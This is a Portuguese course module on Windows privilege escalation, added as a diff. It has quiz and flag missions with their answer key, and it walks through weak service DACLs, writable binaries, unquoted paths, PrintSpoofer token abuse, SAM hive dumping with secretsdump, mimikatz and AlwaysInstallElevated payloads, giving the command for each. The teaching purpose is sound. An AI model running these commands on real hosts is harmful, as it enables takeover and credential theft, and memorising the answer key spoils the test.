@@ -1,0 +1,589 @@
+---
+slug: privesc-windows-vetores
+track: trilha-6
+title: "PrivEsc Windows: serviços, tokens, permissões"
+prerequisites: [privesc-windows-enumeracao]
+lab: null
+tasks:
+  - slug: missao-1-unquoted
+    title: "Missão 1 — SYSTEM por um unquoted service path"
+    type: flag
+    prompt: "O FLAG{...} que você recupera decodificando a nota (em base64) do único serviço que é, de fato, um unquoted service path explorável — o que cruza caminho sem aspas com espaço E um diretório gravável por você. Cole no formato FLAG{...}."
+    hint: "Dois serviços têm caminho sem aspas e com espaço. Só um deles passa por um diretório onde o grupo Users tem (M) de Modify no icacls; o outro é só leitura. A nota (base64) do serviço gravável decodifica para um FLAG{...}; a do outro, para um 'decoy...' que entrega por que ele não serve."
+    flag:
+      hash: "scrypt$16384$8$1$ce6d23f5157b3cf9bed9da9df97e85a69689d36a038b107a46ac42863c8b3694"
+      salt: "88df1ff8c431a0f7a7ae1c0493c64291"
+  - slug: missao-2-change-config
+    title: "Missão 2 — SYSTEM por um DACL de serviço fraco"
+    type: flag
+    prompt: "O FLAG{...} escondido (base64) na nota do único serviço cujo DACL concede a você o direito de reconfigurar o binário (SERVICE_CHANGE_CONFIG ou SERVICE_ALL_ACCESS). Cole no formato FLAG{...}."
+    hint: "No accesschk, procure o serviço onde você tem SERVICE_CHANGE_CONFIG (ou SERVICE_ALL_ACCESS). Não basta SERVICE_QUERY_STATUS: ler a config não reconfigura nada. A nota (base64) desse serviço é a flag; as dos outros decodificam para um aviso."
+    flag:
+      hash: "scrypt$16384$8$1$4c50149de0db0c2a2c84533ce1090a1b2c49d01c257925a525a2747ac95283dd"
+      salt: "160ab83ad6b468c4c91b792aeec3087a"
+  - slug: missao-3-sem-spooler
+    title: "Missão 3 — O caminho que sobra quando o Spooler está desligado"
+    type: flag
+    prompt: "O FLAG{...} do caminho até SYSTEM que funciona NESTE host mesmo com o Print Spooler desligado. Há dois tokens em base64 no dump do registro; decodifique o que não depende de um serviço de coerção. Cole no formato FLAG{...}."
+    hint: "Confirme as duas condições do AlwaysInstallElevated (as duas chaves, HKLM e HKCU, em 0x1). O caminho por SeImpersonatePrivilege depende de um serviço que force a autenticação do SYSTEM — e o Spooler está desligado aqui. Dos dois tokens, decodifique o que não precisa disso."
+    flag:
+      hash: "scrypt$16384$8$1$ed3ea6fcbbe19d9dfb8a22cf193f70eb57264f6ebbccae86293024e6cdd4b774"
+      salt: "47aa5f29e31b491c14b6f49f13c3b654"
+  - slug: quiz-final
+    title: "Quiz — PrivEsc Windows: serviços, tokens, permissões"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que uma configuração errada de serviço no Windows leva, com tanta frequência, direto a SYSTEM?"
+        options:
+          - "Porque todo serviço do Windows roda como administrador por padrão e qualquer usuário pode reiniciá-lo"
+          - "Porque muitos serviços rodam como LocalSystem e o Service Control Manager obedece a quem tem direito de mudar a config ou de trocar o binário: você controla o que o serviço executa, e o poder é a conta LocalSystem que o executa"
+          - "Porque reconfigurar um serviço desliga o controle de contas (UAC) da máquina inteira"
+          - "Porque os serviços guardam a senha do administrador em texto claro no registro"
+        answer: 1
+        explanation: "O vetor mora no cruzamento do 6.1: o que você controla (a config ou o binário do serviço) encontra o que tem poder (a conta sob a qual ele roda, quase sempre LocalSystem). O SCM é só o executor: ele inicia o binário apontado pela config, com a conta configurada. Se o DACL do serviço te deixa reconfigurá-lo, ou se o .exe é gravável por você, você decide o que o LocalSystem executa. Não é que serviço 'seja admin' nem que reconfigurar desligue o UAC: é o encontro de controle e poder."
+      - question: "O `whoami /priv` de uma conta de serviço (um pool do IIS, por exemplo) mostra `SeImpersonatePrivilege` com estado `Enabled`. Por que isso é, na prática, fim de jogo — e o que ele NÃO exige?"
+        options:
+          - "Não é relevante: SeImpersonatePrivilege só serve para o serviço funcionar e não dá poder nenhum ao atacante"
+          - "Porque esse privilégio permite fazer um serviço que roda como SYSTEM se conectar a um named pipe seu e, com ImpersonateNamedPipeClient, vestir o token dele — é o que PrintSpoofer e a família potato fazem; não exige kernel exploit, não exige ser admin, é abuso de um privilégio legítimo"
+          - "Porque SeImpersonatePrivilege dá acesso direto de leitura à memória do LSASS, de onde se extrai a senha do administrador"
+          - "Porque esse privilégio desliga a verificação de integridade dos tokens no kernel"
+        answer: 1
+        explanation: "SeImpersonatePrivilege existe para serviços legítimos personificarem o cliente que os chamou (o IIS 'vira' o usuário autenticado para acessar recursos em nome dele). O abuso: você provoca um serviço SYSTEM a se conectar a um pipe que você controla e, com o privilégio, personifica aquele cliente — que é o SYSTEM. É o coração do PrintSpoofer e dos potato. Não precisa de kernel exploit (o martelo barulhento), não precisa ser admin: é um privilégio de desenho virando escalação."
+      - question: "Um `sc qc` mostra `BINARY_PATH_NAME : C:\\Program Files\\App Sync\\Agent\\run.exe` SEM aspas. Por que isso só vira vetor quando existe um diretório gravável no caminho?"
+        options:
+          - "Porque, sem aspas, o Windows tenta executar cada prefixo terminado em espaço mais .exe (C:\\Program.exe, depois C:\\Program Files\\App.exe, depois ...\\App Sync\\Agent.exe); se você puder gravar em um desses diretórios anteriores, o SEU .exe roda como a conta do serviço — sem diretório gravável, não há onde plantar"
+          - "Porque a falta de aspas faz o serviço rodar como administrador em vez de LocalSystem"
+          - "Porque, sem aspas, o Windows ignora o caminho e executa o primeiro .exe que achar no PATH do sistema"
+          - "Porque a falta de aspas corrompe o registro e trava o SCM"
+        answer: 0
+        explanation: "Com espaços e sem aspas, o CreateProcess do Windows é ambíguo: ele tenta, em ordem, cada corte no espaço com .exe no fim. A falha só é explorável se você conseguir gravar um executável num dos diretórios cortados antes do caminho real — por exemplo `C:\\Program Files\\App Sync\\Agent.exe`. É por isso que o `sc qc` (caminho sem aspas) só vira vetor depois do `icacls` (um diretório do caminho gravável por você). Um sem o outro não escala nada."
+      - question: "Por que o `AlwaysInstallElevated` só é um caminho para SYSTEM quando as DUAS chaves — HKLM e HKCU — estão em `0x1`?"
+        options:
+          - "Porque uma chave liga o recurso e a outra guarda a senha do instalador"
+          - "Porque a política só instala o pacote .msi com privilégio elevado (como SYSTEM) quando as duas, a de máquina (HKLM) e a de usuário (HKCU), estão ligadas; com só uma, o msiexec instala com o seu privilégio normal e não escala nada"
+          - "Porque HKCU vale para 32 bits e HKLM para 64 bits, e você precisa dos dois"
+          - "Porque a segunda chave desativa o Windows Defender durante a instalação"
+        answer: 1
+        explanation: "O AlwaysInstallElevated manda o Windows Installer rodar o .msi com privilégio elevado independentemente de quem o invoca — um pedido de problema. Por segurança, a Microsoft exige que a política esteja ligada nos dois ramos (a de máquina e a do usuário) para valer; qualquer uma sozinha não eleva nada. Quando as duas estão em 0x1, um `msiexec /i payload.msi` feito por um usuário comum roda o payload como SYSTEM. Por isso a enumeração sempre confere as duas."
+      - question: "No HiveNightmare (CVE-2021-36934), por que um usuário comum conseguia ler a base SAM sem nenhum código de exploração?"
+        options:
+          - "Porque a vulnerabilidade era um estouro de buffer no serviço do SAM que dava leitura de memória"
+          - "Porque ACLs permissivas demais deixavam usuários comuns lerem os arquivos de hive SAM, SYSTEM e SECURITY; como os arquivos vivos ficam travados, bastava lê-los por uma volume shadow copy, uma cópia de sombra do volume — era um bug de permissão, não de corrupção de memória"
+          - "Porque o SAM passou a ser guardado em texto claro a partir do Windows 10"
+          - "Porque o usuário precisava primeiro de SeDebugPrivilege para abrir o processo do SAM"
+        answer: 1
+        explanation: "CVE-2021-36934 foi um erro de permissão: o DACL dos arquivos de hive em %windir%\\System32\\config ficou largo demais, liberando leitura a usuários comuns. Os arquivos vivos ficam abertos de forma exclusiva, mas uma volume shadow copy (se houver um ponto de restauração) expõe uma cópia legível. Com SAM + SYSTEM em mãos, extraem-se os hashes das contas locais offline. Não houve corrupção de memória nem necessidade de privilégio especial — só permissões frouxas e uma cópia de sombra."
+      - question: "Você tem três achados numa mesma máquina: (a) a conta de serviço tem SeImpersonatePrivilege, (b) o binário de um serviço LocalSystem é gravável por você, e (c) há um kernel exploit público para a build do Windows. Qual você tenta primeiro e por quê?"
+        options:
+          - "O (c), o kernel exploit, porque é o mais poderoso de todos"
+          - "O (a) ou o (b): abusar de SeImpersonatePrivilege (PrintSpoofer) ou trocar o binário gravável são confiáveis, silenciosos e estáveis; o kernel exploit é o martelo, guardado para o fim porque pode derrubar a máquina e faz barulho"
+          - "Tanto faz: os três têm o mesmo risco e a mesma chance de sucesso"
+          - "O (c) sempre, porque os outros dois dependem de o administrador reiniciar a máquina"
+        answer: 1
+        explanation: "É a mesma priorização do 6.1 e do 6.2, agora no Windows: confiabilidade, ruído e estabilidade. SeImpersonatePrivilege via PrintSpoofer e a troca de um binário gravável são quase garantidos, discretos e não arriscam derrubar o host. O kernel exploit funciona, mas pode travar a máquina (Blue Screen) e acende alarmes — é o último recurso. Nem (a) nem (b) dependem de reinício manual: você mesmo reinicia o serviço que controla."
+glossary:
+  - term: access token
+    definition: "No Windows, o objeto que todo processo carrega descrevendo quem ele é: o SID do usuário, os SIDs dos grupos, a lista de privilégios e o integrity level. O kernel confere esse token contra o descritor de segurança de cada objeto para decidir o que o processo pode. Roubar ou forjar um access token de SYSTEM é virar SYSTEM."
+  - term: SID
+    definition: "Security Identifier: o identificador único e imutável de um principal (usuário, grupo ou conta de serviço) no Windows. É pelo SID, não pelo nome, que o sistema concede ou nega acesso. O SID do SYSTEM é S-1-5-18."
+  - term: integrity level
+    definition: "O rótulo de confiança que o Windows anexa a cada processo e objeto (Low, Medium, High, System). Um processo de integridade mais baixa não pode escrever num objeto de integridade mais alta, mesmo que o DACL permitisse — é uma barreira acima das permissões normais, usada por exemplo para isolar o navegador."
+  - term: Service Control Manager (SCM)
+    definition: "O componente do Windows que registra, inicia, para e configura os serviços. Ele lê, de cada serviço, qual binário executar e sob qual conta — e obedece a quem tiver direito sobre o serviço. Quem pode reconfigurar um serviço LocalSystem manda no que o LocalSystem executa."
+  - term: LocalSystem
+    definition: "A conta de serviço mais poderosa do Windows (SID S-1-5-18, exibida como NT AUTHORITY\\SYSTEM), com controle praticamente total do host local. Muitos serviços rodam como LocalSystem por conveniência — por isso subverter um serviço costuma dar SYSTEM direto."
+  - term: DACL
+    definition: "Discretionary Access Control List: a parte do descritor de segurança de um objeto (arquivo, chave de registro, serviço, processo) que concede acesso. É uma lista de ACEs (Access Control Entries), cada uma dizendo que um SID pode ou não pode certas ações. Um DACL com uma ACE de escrita para o seu grupo em algo que o SYSTEM executa é um vetor de escalação."
+  - term: SeImpersonatePrivilege
+    definition: "O privilégio que permite a uma thread personificar (impersonate) um cliente que se conectou a ela, assumindo o token desse cliente. Existe para serviços legítimos agirem em nome de quem os chamou (o IIS, o SQL Server). Nas mãos erradas, é o que deixa PrintSpoofer e os potato roubarem o token do SYSTEM."
+  - term: SeBackupPrivilege
+    definition: "O privilégio que concede leitura a qualquer arquivo do sistema, ignorando o DACL, para que ferramentas de backup copiem tudo. Com ele, um atacante lê arquivos que não deveria — inclusive os hives SAM e SYSTEM — e extrai os hashes das contas locais."
+  - term: SeDebugPrivilege
+    definition: "O privilégio de depurar qualquer processo, inclusive os do SYSTEM. Permite abrir a memória de um processo privilegiado, injetar código nele ou roubar o seu token — é a chave que o Mimikatz usa para ler credenciais do LSASS."
+  - term: unquoted service path
+    definition: "Um serviço cujo caminho do binário (ImagePath) tem espaços e não está entre aspas. O Windows então tenta executar cada prefixo cortado no espaço mais .exe; se um diretório anterior ao binário real for gravável por você, o seu executável roda no lugar — com a conta do serviço."
+  - term: Print Spooler
+    definition: "O serviço de impressão do Windows, que roda como SYSTEM e expõe uma interface RPC. Por anos foi uma fonte fértil de falhas (PrintNightmare) e de coerção de autenticação: o PrintSpoofer o usa para fazer o SYSTEM se conectar a um named pipe do atacante."
+  - term: volume shadow copy
+    definition: "Uma cópia de sombra (snapshot) de um volume feita pelo Volume Shadow Copy Service, usada para backups e pontos de restauração. Como ela congela o estado do disco, dá acesso de leitura a arquivos que estão travados no sistema vivo — foi o que o HiveNightmare usou para ler a base SAM."
+  - term: SAM
+    definition: "Security Account Manager: o banco onde o Windows guarda os usuários e os hashes de senha das contas locais. Vive como um hive de registro travado em %windir%\\System32\\config\\SAM; lê-lo (por backup, shadow copy ou SeBackupPrivilege) e cruzá-lo com o hive SYSTEM entrega os hashes locais."
+  - term: UAC
+    definition: "User Account Control: o mecanismo que, para contas administrativas, entrega por padrão um token filtrado de integridade média e só eleva ao token completo de integridade alta mediante consentimento. É por isso que 'ser admin' não é o mesmo que estar rodando como admin — e por que uma parte da escalação no Windows é apenas contornar o UAC."
+  - term: living off the land
+    definition: "A tática de usar apenas o que já existe no alvo — binários e recursos legítimos do próprio sistema — em vez de trazer ferramentas. É mais silencioso e evita artefatos; no Windows, esses binários subvertíveis são catalogados no LOLBAS, e muito da escalação por serviços e registro é feito só com `sc`, `reg` e `icacls`, que já vêm na máquina."
+---
+
+import caminhosAteSystem from "./img/caminhos-ate-system.svg";
+import coercaoDeToken from "./img/coercao-de-token.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No 6.4 você aprendeu a **enumerar** um host Windows a partir de um acesso de baixo privilégio: listar serviços, privilégios do seu token, permissões de arquivos e chaves de registro, e separar o ruído dos poucos achados que importam. Este módulo é o passo seguinte — transformar cada um desses achados em **SYSTEM**, a conta mais poderosa da máquina.
+
+A escalação local no Windows quase nunca é um exploit de filme. Na prática é mais prosaica e mais confiável: um serviço que roda como <GlossaryTerm term="LocalSystem">LocalSystem</GlossaryTerm> e que você pode reconfigurar; uma conta de serviço com um privilégio solto que deixa você vestir o <GlossaryTerm term="access token">access token</GlossaryTerm> do SYSTEM; um arquivo ou uma chave de registro gravável que decide o que o SYSTEM executa. São erros de configuração, não de código — e por isso aparecem em quase todo ambiente real. Entender esses caminhos é tão importante para quem **defende** (fecha o serviço, remove o privilégio, aperta a permissão) quanto para quem **ataca**.
+
+**Ao final, você vai saber:**
+
+- explicar o modelo de identidade do Windows (SID, token, privilégios, integrity level) e por que uma config errada vira SYSTEM;
+- explorar as três famílias de vetor — **serviços** mal configurados, **abuso de tokens** e **permissões** de arquivo/registro — passo a passo;
+- reconhecer, numa saída de enumeração, qual achado é o vetor real e qual é chamariz;
+- defender cada vetor: o que mudar no serviço, no privilégio e na permissão, e como detectar o abuso.
+
+**Pré-requisitos:** 6.4 — PrivEsc Windows: enumeração (você vai partir das saídas de `sc`, `accesschk`, `whoami /priv`, `icacls` e `reg query` que aprendeu a coletar lá).
+
+**Tempo estimado:** 3 a 4 horas, incluindo as missões de análise.
+
+<Callout variant="ethics">
+Tudo aqui se faz **só** em ambiente autorizado: o seu próprio Windows, uma VM sua ou um alvo com autorização por escrito. Escalar privilégio numa máquina de terceiros sem permissão é crime (você viu o enquadramento na Trilha 1). As missões deste módulo são de **análise de saídas** que você gera no seu próprio WSL — nenhuma máquina é atacada.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+Para entender por que uma permissão errada vira SYSTEM, primeiro é preciso entender **como o Windows decide quem pode o quê**. O modelo é diferente do Linux (uid/gid), e a escalação explora exatamente as junções desse modelo.
+
+### 2.1 Identidade: SID, token e integrity level
+
+Todo usuário, grupo e conta de serviço no Windows tem um <GlossaryTerm term="SID">SID</GlossaryTerm> (Security Identifier) — um identificador único e imutável. O sistema concede acesso pelo SID, não pelo nome; o SID do SYSTEM, por exemplo, é sempre `S-1-5-18`.
+
+Quando você faz login (ou um serviço inicia), o Windows cria um <GlossaryTerm term="access token">access token</GlossaryTerm>: um objeto que o processo carrega consigo e que lista o seu SID, os SIDs dos seus grupos, os seus **privilégios** e o seu <GlossaryTerm term="integrity level">integrity level</GlossaryTerm>. É a carteira de identidade do processo. A cada vez que ele tenta abrir um arquivo, um serviço ou uma chave de registro, o kernel compara esse token com o descritor de segurança do objeto e decide. Isto é central: **mudar o que o processo pode é mudar o token** — e é exatamente isso que o abuso de tokens faz.
+
+O integrity level é uma trava acima das permissões normais. Cada processo tem um rótulo (Low, Medium, High, System) e, pela regra do Mandatory Integrity Control, um processo de integridade mais baixa não escreve num objeto de integridade mais alta, mesmo que o DACL deixasse. É isso que isola o navegador (que roda em Low) do resto do sistema. O <GlossaryTerm term="UAC">UAC</GlossaryTerm> (User Account Control) usa a mesma ideia: mesmo numa conta de administrador, o Windows entrega por padrão um token *filtrado* de integridade média, e só eleva ao token completo (integridade alta) com o seu consentimento. Por isso "ser admin" não é o mesmo que "estar rodando como admin" — uma parte inteira da escalação no Windows é só passar de médio para alto.
+
+### 2.2 Privilégios: o poder que ignora as permissões
+
+Além dos grupos, o token carrega **privilégios** — direitos que valem independentemente do DACL de qualquer objeto. Eles são o análogo Windows das <GlossaryTerm term="Linux capabilities">Linux capabilities</GlossaryTerm> que você viu na Trilha 2: fatias do poder total, dadas a quem precisa. Três importam muito para a escalação, e os três costumam aparecer em contas de **serviço**:
+
+- <GlossaryTerm term="SeImpersonatePrivilege">SeImpersonatePrivilege</GlossaryTerm> — personificar um cliente que se conectou a você. É legítimo (o IIS "vira" o usuário autenticado para servir o arquivo dele), mas é o que permite roubar o token do SYSTEM.
+- <GlossaryTerm term="SeBackupPrivilege">SeBackupPrivilege</GlossaryTerm> — ler qualquer arquivo, ignorando o DACL, "para fazer backup". Lê a base <GlossaryTerm term="SAM">SAM</GlossaryTerm> inteira.
+- <GlossaryTerm term="SeDebugPrivilege">SeDebugPrivilege</GlossaryTerm> — depurar qualquer processo, inclusive os do SYSTEM. Abre a memória do LSASS e rouba tokens.
+
+O ponto profundo: um privilégio desses é, por desenho, "código legítimo rodando com poder a pedido de alguém". A escalação só muda **quem** pede.
+
+### 2.3 Serviços e o Service Control Manager
+
+Um serviço do Windows é um programa que roda em segundo plano, iniciado e gerenciado pelo <GlossaryTerm term="Service Control Manager (SCM)">Service Control Manager</GlossaryTerm> (SCM). Para cada serviço, o SCM guarda, no registro, duas coisas que nos interessam: **qual binário executar** (o `ImagePath`) e **sob qual conta** (o `SERVICE_START_NAME`, muitas vezes `LocalSystem`).
+
+O SCM é só o executor obediente: ele roda o binário apontado, com a conta configurada, para quem tiver direito sobre o serviço. E aí mora a falha. Se o descritor de segurança (o DACL) do serviço te dá o direito `SERVICE_CHANGE_CONFIG`, você reescreve o `ImagePath` para o seu programa; se o próprio `.exe` do serviço é gravável por você, você o substitui; se o caminho tem espaços e está sem aspas (um <GlossaryTerm term="unquoted service path">unquoted service path</GlossaryTerm>) e um diretório anterior é gravável, você planta um `.exe` ali. Nos três casos, na próxima vez que o serviço iniciar, é o **seu** código rodando como LocalSystem.
+
+### 2.4 Permissões: DACL, arquivos e registro
+
+Todo objeto securizável do Windows (arquivo, chave de registro, serviço, processo) tem um descritor de segurança, e a parte dele que concede acesso é o <GlossaryTerm term="DACL">DACL</GlossaryTerm> (Discretionary Access Control List): uma lista ordenada de ACEs (Access Control Entries), cada uma dizendo "este SID pode (ou não pode) estas ações". Quando o DACL de algo que o SYSTEM lê ou executa inclui uma ACE de escrita para o seu grupo, você controla o que o SYSTEM vai fazer. É a mesma lógica do arquivo de cron gravável no Linux (6.3), traduzida para o Windows: um binário de serviço, um script de tarefa agendada, uma chave `Run`, um pacote de instalação — se o SYSTEM confia e você pode escrever, é vetor.
+
+<Figure
+  src={caminhosAteSystem}
+  alt="Diagrama de três trilhas horizontais saindo de uma conta de serviço de baixo privilégio e convergindo para uma caixa SYSTEM. Trilha 1, serviços: você controla a config ou o binário, o poder é a conta LocalSystem, a ação é sc config binPath= ou um unquoted path. Trilha 2, tokens: você controla um named pipe ou processo, o poder é SeImpersonate ou SeDebug, a ação é PrintSpoofer ou roubar o token do SYSTEM. Trilha 3, permissões: você controla um arquivo ou registro gravável, o poder é o que o SYSTEM lê ou executa, a ação é AlwaysInstallElevated ou ler o SAM por uma shadow copy. Uma faixa embaixo repete a regra do 6.1."
+  caption="As três famílias de vetor convergem para SYSTEM. Em todas, a regra do 6.1: o vetor mora no cruzamento entre o que você controla e o que tem poder."
+/>
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos à mecânica de cada família, com os comandos reais. Todos usam ferramentas que já vêm no Windows (`sc`, `reg`, `icacls`, `net`) ou o `accesschk` da Sysinternals — é <GlossaryTerm term="living off the land">living off the land</GlossaryTerm> na veia, quase sem trazer nada para o disco.
+
+### 3.1 Serviços mal configurados
+
+**Vetor A — DACL do serviço fraco.** Suponha que a enumeração (com `accesschk`) revelou que o seu usuário tem `SERVICE_CHANGE_CONFIG` sobre o serviço `VulnSvc`, que roda como LocalSystem. Você reescreve o binário que ele executa e o reinicia:
+
+```console
+C:\> sc qc VulnSvc
+[SC] QueryServiceConfig SUCCESS
+        BINARY_PATH_NAME   : C:\Services\vulnsvc.exe
+        SERVICE_START_NAME : LocalSystem
+
+C:\> sc config VulnSvc binPath= "cmd /c net localgroup administrators webapp /add"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\> sc stop VulnSvc & sc start VulnSvc
+```
+
+Repare no detalhe que trava todo iniciante: em `binPath=` **o espaço depois do sinal de igual é obrigatório** (`binPath= "..."`), porque o `sc` usa esse formato `chave= valor`. Quando o serviço reinicia, o SCM executa o seu comando como LocalSystem — aqui, adicionar o usuário `webapp` ao grupo de administradores locais. Você não precisou de senha nem de exploit: o SCM obedeceu porque o DACL do serviço te deu o direito.
+
+**Vetor B — binário do serviço gravável.** Às vezes o DACL do serviço é firme, mas o `icacls` mostra que o próprio `.exe` é gravável por você (uma pasta de instalação com permissões frouxas). Então você não reconfigura nada: troca o arquivo por um payload com o mesmo nome e espera (ou força) o serviço reiniciar.
+
+```console
+C:\> icacls "C:\Services\vulnsvc.exe"
+C:\Services\vulnsvc.exe BUILTIN\Users:(M)
+                        NT AUTHORITY\SYSTEM:(F)
+```
+
+O `(M)` (Modify) para `Users` é a sentença: você pode sobrescrever o binário que o LocalSystem vai executar.
+
+**Vetor C — unquoted service path.** Se o `sc qc` mostra o caminho **sem aspas e com espaços**, o `CreateProcess` do Windows fica ambíguo. Para `C:\Program Files\App Sync\Agent\run.exe`, ele tenta, em ordem:
+
+```text
+C:\Program.exe
+C:\Program Files\App.exe
+C:\Program Files\App Sync\Agent.exe
+C:\Program Files\App Sync\Agent\run.exe   (o certo, só no fim)
+```
+
+Se você puder gravar em `C:\` ou em `C:\Program Files\App Sync\` (o `icacls` dirá), planta ali um `Program.exe` ou um `Agent.exe` e ele roda primeiro, como a conta do serviço. É a mesma mecânica do PATH no Linux, mas provocada por aspas faltando.
+
+### 3.2 Abuso de tokens
+
+Se o `whoami /priv` mostra `SeImpersonatePrivilege` como `Enabled` — comum em contas de serviço do IIS e do SQL Server —, o caminho mais limpo é a família **potato**. O representante moderno é o **PrintSpoofer** (itm4n, 2020), que funciona onde o antigo JuicyPotato não funciona mais (Windows 10 1809+ e Server 2019):
+
+```console
+C:\inetpub> whoami
+iis apppool\defaultapppool
+
+C:\inetpub> whoami /priv | findstr Impersonate
+SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
+
+C:\inetpub> PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+O que acontece por baixo é o <GlossaryTerm term="token impersonation">token impersonation</GlossaryTerm> que dá nome à família <GlossaryTerm term="potato attack">potato attack</GlossaryTerm>, e está no diagrama abaixo.
+
+<Figure
+  src={coercaoDeToken}
+  alt="Diagrama de sequência em cinco passos entre o seu processo (conta de serviço com SeImpersonatePrivilege) e um serviço privilegiado do sistema (Print Spooler, rodando como SYSTEM). Passo 1: seu processo cria um named pipe e escuta. Passo 2: provoca o serviço por RPC pedindo que ele se conecte ao seu pipe. Passo 3: o serviço SYSTEM conecta ao seu pipe, virando um cliente SYSTEM. Passo 4: você chama ImpersonateNamedPipeClient e, graças ao SeImpersonatePrivilege, sua thread veste o token do SYSTEM. Passo 5: você chama CreateProcessAsUser e lança um cmd rodando como SYSTEM."
+  caption="O abuso de SeImpersonatePrivilege: um serviço SYSTEM é provocado a se conectar ao seu named pipe, e você veste o token dele. É o coração do PrintSpoofer e dos potato."
+/>
+
+Os outros dois privilégios dão caminhos diferentes. Com `SeBackupPrivilege`, você copia os hives que normalmente não poderia ler e extrai os hashes locais offline:
+
+```console
+C:\> reg save HKLM\SAM  C:\Temp\sam.hive
+C:\> reg save HKLM\SYSTEM C:\Temp\system.hive
+# depois, numa máquina sua: secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+Com `SeDebugPrivilege`, você abre um processo do SYSTEM e rouba o token dele (é o que o `mimikatz` faz com `privilege::debug` + `token::elevate`).
+
+### 3.3 Permissões de arquivo e registro
+
+O vetor mais limpo dessa família é o <GlossaryTerm term="AlwaysInstallElevated">AlwaysInstallElevated</GlossaryTerm>. Se as **duas** chaves de política estiverem ligadas, qualquer `.msi` instalado por um usuário comum roda como SYSTEM:
+
+```console
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    AlwaysInstallElevated    REG_DWORD    0x1
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+C:\> msiexec /quiet /qn /i C:\Temp\payload.msi
+```
+
+O `.msi` você gera numa máquina sua (`msfvenom -f msi`). Outros alvos dessa família: uma chave `Run` gravável (persistência que o SYSTEM executa), uma tarefa agendada cujo script é gravável, ou o <GlossaryTerm term="DLL hijacking">DLL hijacking</GlossaryTerm> de um serviço que carrega uma DLL de um diretório gravável.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### HiveNightmare / SeriousSAM — CVE-2021-36934 (2021)
+
+Em julho de 2021 descobriu-se que, no Windows 10 (versão 1809 em diante) e no Windows 11, o DACL dos arquivos de hive `SAM`, `SYSTEM` e `SECURITY` em `%windir%\System32\config` ficara **permissivo demais**: o grupo de usuários comuns tinha direito de leitura. Os arquivos vivos ficam travados, mas se houvesse uma <GlossaryTerm term="volume shadow copy">volume shadow copy</GlossaryTerm> (criada por qualquer ponto de restauração), um usuário sem privilégio lia a cópia e extraía os hashes de todas as contas locais — incluindo a do administrador. Nenhum código de exploração sofisticado: só permissões frouxas e uma cópia de sombra.
+
+- **Impacto:** elevação de privilégio local, CVSS 3.1 de **7.8 (High)**; afetou Windows 10 1809/1909/2004/20H2/21H1, Windows 11 e Windows Server 2019. A CVE entrou no catálogo **KEV** (vulnerabilidades exploradas conhecidas) da CISA em 10 de fevereiro de 2022.
+- **Lição:** permissão de arquivo é controle de segurança. O caso é o retrato perfeito da família "permissões": o SYSTEM guarda um segredo num arquivo, e um DACL errado o entrega. A correção da Microsoft saiu em 10 de agosto de 2021.
+- **Fonte:** [CVE-2021-36934 — Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934).
+
+### PrintSpoofer e o abuso de SeImpersonatePrivilege (2020)
+
+Em 2 de maio de 2020, o pesquisador itm4n publicou o **PrintSpoofer**, mostrando como abusar de `SeImpersonatePrivilege` em Windows 10 e Server 2019 — justamente onde o JuicyPotato havia parado de funcionar (a Microsoft restringiu as conexões COM que os potato antigos usavam). A técnica provoca o <GlossaryTerm term="Print Spooler">Print Spooler</GlossaryTerm> a se conectar a um named pipe do atacante e, pela personificação, entrega SYSTEM. Como contas de serviço de IIS e SQL Server costumam ter esse privilégio, virou o caminho padrão de escalação a partir de uma web shell nesses servidores.
+
+- **Impacto:** de `LOCAL SERVICE`/`NETWORK SERVICE` a SYSTEM em um comando, sem exploit de memória. A técnica e suas primas (RoguePotato, GodPotato) seguem funcionando em versões atuais.
+- **Lição:** um privilégio "de desenho" pode ser tão perigoso quanto um bug. A defesa é não dar `SeImpersonatePrivilege` a quem não precisa — e tratar toda conta de serviço com esse privilégio como um pé meio dentro de SYSTEM.
+- **Fonte:** [PrintSpoofer – Abusing Impersonation Privileges on Windows 10 and Server 2019 (itm4n)](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).
+
+### Stuxnet e o Task Scheduler — CVE-2010-3338 (2010)
+
+O Stuxnet, o worm que sabotou centrífugas de enriquecimento de urânio no Irã, usou **quatro** zero-days do Windows. Um deles era uma escalação local no Agendador de Tarefas: o Windows validava a integridade de um arquivo de tarefa só com um checksum CRC32. Um usuário comum podia editar a própria tarefa para rodar como SYSTEM e forjar uma colisão de CRC32, de modo que a tarefa adulterada parecesse íntegra. A Microsoft corrigiu em 14 de dezembro de 2010 (boletim MS10-092).
+
+- **Impacto:** execução como SYSTEM a partir de um usuário comum, usada por um dos ataques mais sofisticados já documentados.
+- **Lição:** um controle de integridade fraco (CRC32 não é assinatura) é o mesmo que nenhum. Escalação local não é detalhe: foi uma peça essencial de uma operação de Estado.
+- **Fonte:** [MS10-092 — Microsoft Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092).
+
+## 5. Mãos à obra — ler a config e achar o caminho até SYSTEM
+
+Este módulo **não tem lab próprio**: o alvo é o Windows, que não roda no seu WSL. Mas a habilidade central aqui não é apertar um botão de exploit — é **ler uma saída de enumeração e decidir qual achado é o vetor real**. É isso que você vai treinar, contra cenários que você mesmo gera no seu Ubuntu (WSL), a partir de saídas reais de `sc`, `accesschk`, `whoami /priv`, `icacls` e `reg query` (sanitizadas: host `SRV-APP01`, usuário `webapp`, IP `192.168.0.10`).
+
